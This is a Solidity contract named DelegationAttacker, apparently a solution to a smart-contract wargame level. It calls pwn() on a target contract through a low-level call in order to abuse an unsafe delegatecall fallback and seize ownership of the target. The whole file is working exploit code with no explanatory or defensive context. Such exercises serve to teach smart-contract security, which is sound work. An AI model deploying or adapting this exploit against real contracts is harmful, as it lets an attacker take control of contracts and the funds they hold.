// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';

contract DelegationAttacker is Ownable {

  address private delegation;

  constructor(address _delegation) {
    delegation = _delegation;
  }

  function stealOwnership() external onlyOwner {
    delegation.call(abi.encodeWithSignature("pwn()"));
  }
}